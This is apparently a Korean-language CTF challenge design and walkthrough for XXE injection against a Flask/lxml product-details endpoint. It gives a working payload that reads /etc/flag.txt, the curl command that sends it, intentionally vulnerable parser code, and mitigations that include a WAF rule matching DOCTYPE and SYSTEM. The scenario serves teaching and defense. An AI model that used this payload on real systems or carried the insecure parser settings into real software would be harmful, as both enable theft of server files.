---
title: XML External Entity (XXE) Injection leading to LFI — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, xxe, xml, lfi, soap, parser-vulnerability]
confidence: high
---

# XML External Entity (XXE) Injection leading to LFI — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: XML Product Details (XML 제품 상세 조회기)
- **난이도**: Medium
- **핵심 컨셉**: 웹 애플리케이션의 구조화 데이터 파싱에서 발생하는 대표적 취약점인 **XML 외부 엔티티(XXE) 인젝션** 문제입니다. 대상 시스템은 클라이언트와 통신 시 XML 혹은 SOAP 데이터 포맷을 사용하여 제품 ID에 대한 상세 내역을 주고받습니다. 이때, 백엔드 XML 파서가 외부 엔티티 참조 해결 기능(External Entity Resolution)을 기본값으로 활성화하고 있어, 공격자가 조작된 DOCTYPE 선언과 함께 로컬 경로 조회를 지정한 XML 엔티티를 삽입해 전달하면 서버 내부 파일의 정보가 조회 결과에 노출되어 유출됩니다. (picoCTF `SOAP` 영감)

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Portal**: 사용자가 특정 제품의 "상세 정보(Details)" 버튼을 누르면 실시간 비동기(AJAX) 요청으로 XML 형식의 데이터를 전송하여 화면에 제품 스펙을 표시하는 구조.
- **Backend Service (Python/lxml or Java/XMLParser)**:
  - 클라이언트가 POST 데이터로 전송한 XML 본문 수신.
  - XML 문서 분석을 위해 파서(Parser) 인스턴스를 구동하여 `<productID>` 값을 읽은 뒤 조회 결과를 다시 XML/JSON 형태로 반환.
- **Flag 위치**:
  - 서버 로컬 루트 또는 특정 파일: `/etc/flag.txt`

### 2.2 취약점 지점
1. **Unsecured XML DTD Processing (XXE)**:
   - XML 파서 설정 중 DTD 처리 및 외부 엔티티 파싱 기능인 `resolve_entities`가 활성화되어 있습니다.
   - 공격자는 임의의 외부 엔티티를 정의하고(예: `SYSTEM "file:///etc/flag.txt"`), 해당 엔티티를 웹페이지 결과물에 렌더링되는 특정 엘리먼트 값에 대입하여 파일 데이터를 탈취합니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body XML) | 반환 값 (Response) | 비고 |
|------------|--------|------|--------------------|-------------------|------|
| `/api/details`| POST | 없음 | XML 페이로드 (예: `<data><id>1</id></data>`) | 제품 상세 설명 또는 에러 결과물 | XML 파서 취약점 발생 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 비동기 요청 패킷 확인
사용자가 메인 화면에서 상품 상세 정보를 클릭하고 전송되는 패킷을 Burp Suite 또는 개발자 도구의 Network 탭으로 잡아 분석합니다.
- *전송되는 Raw Request*:
  ```http
  POST /api/details HTTP/1.1
  Host: product.challenge.local
  Content-Type: application/xml
  Content-Length: 72

  <?xml version="1.0" encoding="UTF-8"?>
  <data>
    <productID>3</productID>
  </data>
  ```
- *서버 응답*:
  ```json
  {"status": "success", "description": "This is a premium electronic gadget."}
  ```

### Step 2. XXE 인젝션 페이로드 작성
XML 헤더와 루트 노드 사이에 `DOCTYPE` 선언을 명시하고 내부에서 시스템 파일을 지정하는 외부 엔티티(`xxe`)를 정의합니다. 그리고 서버 화면에 노출되는 `<productID>` 값 부분에 해당 엔티티 매핑 주소(`&xxe;`)를 기입합니다.
- **조작된 XML 본문 페이로드**:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE data [
    <!ENTITY xxe SYSTEM "file:///etc/flag.txt">
  ]>
  <data>
    <productID>&xxe;</productID>
  </data>
  ```

### Step 3. 조작된 요청 전송 및 결과 확인
공격자는 위의 XML 본문을 POST 바디에 실어 `/api/details` 엔드포인트로 전송합니다.
- *요청 수행 (curl 이용 예시)*:
  ```bash
  curl -X POST http://product.challenge.local/api/details \
       -H "Content-Type: application/xml" \
       -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/flag.txt">]><data><productID>&xxe;</productID></data>'
  ```
- *서버 응답 결과*:
  파서가 `&xxe;` 엔티티를 로드할 때 서버 로컬에 있는 `/etc/flag.txt` 파일을 열어 그 텍스트 내용 전체를 인메모리에 가져옵니다. 그 다음 결과값 매핑에 의해 description 또는 ID 응답 구조에 플래그가 포함되어 리턴됩니다.
  ```json
  {"status": "success", "description": "picoCTF{xxe_inpurt_parser_bypass_u_got_it}"}
  ```

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python lxml)

```python
# app.py (lxml 취약 예시)
from flask import Flask, request, jsonify
from lxml import etree

app = Flask(__name__)

@app.route("/api/details", methods=["POST"])
def get_product_details():
    xml_data = request.data
    
    try:
        # 취약점 핵심 지점: 
        # lxml 파서 기본 옵션 중 resolve_entities=True 로 설정되거나 
        # XMLSchema 또는 DTD 파싱을 제한 없이 수행할 때 외부 참조가 가능해집니다.
        parser = etree.XMLParser(resolve_entities=True, no_network=False)
        root = etree.fromstring(xml_data, parser=parser)
        
        # productID 엘리먼트 추출
        product_id_elem = root.find("productID")
        if product_id_elem is None:
            return jsonify({"error": "Missing productID"}), 400
            
        # productID 텍스트 값을 읽어옴 (외부 엔티티가 해석된 후 최종 문자열이 반환됨)
        product_id = product_id_elem.text
        
        # 비즈니스 로직에 매핑 (실제 문제 환경에 따라 데이터 조회)
        description = f"Details for product ID: {product_id}"
        
        return jsonify({"status": "success", "description": description})
    except Exception as e:
        return jsonify({"error": f"XML parsing error: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **외부 엔티티 해석 비활성화 (Disable External Entities / DTD Processing)**:
   - XML 파서가 외부 엔티티나 DTD 선언을 아예 처리하지 못하도록 명시적으로 속성을 변경합니다.
   - **안전한 Python 코드 설정 예시**:
     ```python
     # lxml 파서 생성 시 resolve_entities 및 dtd_validation을 완전히 끕니다.
     parser = etree.XMLParser(resolve_entities=False, dtd_validation=False, no_network=True)
     ```
2. **JSON 포맷으로의 전환**:
   - 꼭 XML 구조를 유지해야 하는 것이 아니라면, 현대식의 안전하고 파싱 취약점 우려가 상대적으로 적은 JSON API 포맷으로 입력 시스템을 마이그레이션합니다.
3. **WAF (Web Application Firewall) 규칙 설정**:
   - 유입되는 데이터 패킷에 `<!DOCTYPE` 또는 `SYSTEM`과 같은 단어 지시어가 잡히는 요청을 게이트웨이 단계에서 필터링합니다.
